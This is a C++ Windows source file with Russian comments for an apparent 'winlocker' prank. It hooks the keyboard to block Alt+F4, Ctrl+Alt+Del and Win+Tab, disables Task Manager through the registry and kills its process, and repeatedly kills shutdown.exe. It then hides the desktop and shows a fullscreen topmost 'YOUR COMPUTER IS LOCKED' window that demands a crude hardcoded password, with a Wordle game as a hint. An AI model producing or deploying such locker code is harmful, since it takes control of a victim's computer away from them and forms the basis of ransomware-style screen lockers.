#define UNICODE  // <- Фикс: Включаем Unicode
#define _UNICODE // <- Фикс: Для TCHAR

#include <windows.h>
#include <winuser.h>
#include <commctrl.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <shlobj.h>  // Для реестра
#include <tchar.h>   // <- Фикс: Для TCHAR (wchar_t в PROCESSENTRY32)

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")

// Загаданное слово
const std::wstring SECRET_WORD = L"ПЕНИС";

// Глобалки
HWND hMainWnd = NULL;
bool locked = true;
HWND hWordleWnd = NULL;
std::wstring currentGuess;

// Low-level keyboard hook для блокировок
HHOOK hKeyboardHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;

        // Блок Alt+F4
        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        // Блок Ctrl+Alt+Del
        if (vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        // Блок Win+Tab
        if ((vkCode == VK_LWIN || vkCode == VK_RWIN) && (GetAsyncKeyState(VK_TAB) & 0x8000)) {
            return 1;
        }
        // Экстренно: Shift+0
        if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            locked = false;
            PostQuitMessage(0);
            return 1;
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Установка хука
void InstallHook() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
}

// Удаление хука
void UninstallHook() {
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
}

// Убить процесс по имени (теперь с _wcsicmp для wchar_t)
void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32;  // <- Фикс: Явно W-версия (wchar_t)
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {  // <- W-версия
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {  // <- Теперь wchar_t*
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));  // <- W-версия
    }
    CloseHandle(hSnapshot);
}

// Блок Task Manager через реестр (W-версии)
void BlockTaskManager() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);  // <- W
    DWORD value = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));  // <- W
    RegCloseKey(hKey);
    KillProcessByName(L"taskmgr.exe");
}

// Разблок Task Manager (W-версии)
void UnblockTaskManager() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {  // <- W
        DWORD value = 0;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));  // <- W
        RegCloseKey(hKey);
    }
}

// Мониторинг shutdown
void MonitorShutdown() {
    while (locked) {
        KillProcessByName(L"shutdown.exe");
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Скрыть рабочий стол (W-версии)
void HideDesktop() {
    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");  // <- W
    if (hProgman) ShowWindow(hProgman, SW_HIDE);
}

// Показать рабочий стол (W-версии)
void ShowDesktop() {
    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");  // <- W
    if (hProgman) ShowWindow(hProgman, SW_SHOW);
}

// Wordle: Простая реализация (упрощённо, логика в WndProc)
std::wstring GetColorClass(wchar_t guessChar, int pos) {
    if (guessChar == SECRET_WORD[pos]) return L"green";
    size_t count = 0;
    for (size_t i = 0; i < SECRET_WORD.length(); ++i) {
        if (SECRET_WORD[i] == guessChar) ++count;
    }
    size_t used = 0;
    for (size_t i = 0; i < pos; ++i) {
        if (guessChar == SECRET_WORD[i]) ++used;
    }
    if (count > used) return L"yellow";
    return L"gray";
}

void StartWordle(HWND parent) {
    if (hWordleWnd) return;
    hWordleWnd = CreateWindowExW(0, L"STATIC", L"Wordle Prank", WS_OVERLAPPEDWINDOW | WS_VISIBLE,  // <- W
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, parent, NULL, GetModuleHandle(NULL), NULL);
    ShowWindow(hWordleWnd, SW_SHOWMAXIMIZED);
    SetWindowPos(hWordleWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

    // Простой Edit для ввода (логика проверки в WndProc Wordle)
    CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,  // <- W
        100, 100, 200, 30, hWordleWnd, (HMENU)10, GetModuleHandle(NULL), NULL);
}

// Проверка пароля
void CheckPassword(HWND hEdit) {
    wchar_t buffer[256];
    GetWindowTextW(hEdit, buffer, 256);  // <- W
    std::wstring pass(buffer);
    if (pass == L"пенис") {  // Сравнение case-insensitive? Добавь wcslwr если нужно
        locked = false;
        UnblockTaskManager();
        ShowDesktop();
        PostQuitMessage(0);
    } else {
        MessageBoxW(NULL, L"Неверный пароль!", L"Ошибка", MB_OK | MB_ICONERROR);  // <- W
    }
}

// WndProc для главного окна
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE: {
        // Лейбл (W)
        CreateWindowExW(0, L"STATIC", L"ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\nДля разблокировки введите пароль:", WS_VISIBLE | WS_CHILD,  // <- W
            100, 100, 400, 100, hWnd, NULL, GetModuleHandle(NULL), NULL);
        // Edit для пароля (W)
        HWND hEdit = CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_PASSWORD,  // <- W
            100, 200, 300, 30, hWnd, (HMENU)1, GetModuleHandle(NULL), NULL);
        // Кнопка Wordle (W)
        CreateWindowExW(0, L"BUTTON", L"Сыграть в Wordle (подсказка к паролю)", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,  // <- W
            100, 250, 300, 30, hWnd, (HMENU)2, GetModuleHandle(NULL), NULL);
        // Кнопка разблокировать (W)
        CreateWindowExW(0, L"BUTTON", L"Разблокировать", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,  // <- W
            100, 300, 150, 30, hWnd, (HMENU)3, GetModuleHandle(NULL), NULL);
        SetFocus(hEdit);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == 2) StartWordle(hWnd);  // Wordle
        if (LOWORD(wParam) == 3) {  // Unlock
            HWND hEdit = GetDlgItem(hWnd, 1);
            CheckPassword(hEdit);
        }
        if (LOWORD(wParam) == 1 && HIWORD(wParam) == EN_CHANGE) {  // Enter on edit? Лучше WM_KEYDOWN
            CheckPassword(GetDlgItem(hWnd, 1));
        }
        break;
    }
    case WM_KEYDOWN:
        if (wParam == VK_RETURN) CheckPassword(GetDlgItem(hWnd, 1));
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Главная функция (теперь LPWSTR для UNICODE)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {  // <- Фикс: LPWSTR
    // Установка хука, блокировок
    InstallHook();
    BlockTaskManager();
    HideDesktop();
    std::thread shutdownMonitor(MonitorShutdown);

    // Регистрация класса окна (W)
    WNDCLASSW wc = {0};  // <- W
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"WinLockerClass";  // <- Уже wide
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);  // <- W

    // Создание окна (W)
    hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"WinLockerClass", L"Заблокировано",  // <- W
        WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);
    ShowWindow(hMainWnd, SW_MAXIMIZE);

    // Цикл сообщений
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && locked) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UninstallHook();
    UnblockTaskManager();
    ShowDesktop();
    shutdownMonitor.detach();
    return 0;
}
